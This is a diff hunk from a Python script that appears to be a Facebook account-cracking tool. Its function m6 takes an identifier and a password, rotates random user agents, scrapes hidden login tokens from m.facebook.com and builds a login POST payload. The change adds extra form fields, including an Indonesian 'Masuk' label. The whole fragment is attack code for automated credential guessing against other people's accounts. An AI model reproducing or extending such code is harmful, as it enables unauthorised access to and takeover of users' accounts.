@@ -1213,16 +1213,24 @@ def m6(idf,pwv):
             #sys.stdout.flush()
    pro = random.choice(ugen)
    free_fb = session.get('https://m.facebook.com').text
-   log_data = {
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":idf,
-            "pass":ps,
-            "login":"Log In"}
+   log_data = {'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+            'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+            'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+            'try_number': 0, 
+            'unrecognized_tries': 0, 
+            'email': idf, 
+            'pass': ps, 
+            'login': 'Masuk', 
+            'prefill_contact_point': '', 
+            'prefill_source': '', 
+            'prefill_type': '', 
+            'first_prefill_source': '', 
+            'first_prefill_type': '', 
+            'had_cp_prefilled': False, 
+            'had_password_prefilled': False, 
+            'is_smart_lock': False, 
+            'bi_xrwh': 0}
    header_freefb = {
             'authority': 'm.facebook.com',
             'method': 'GET',
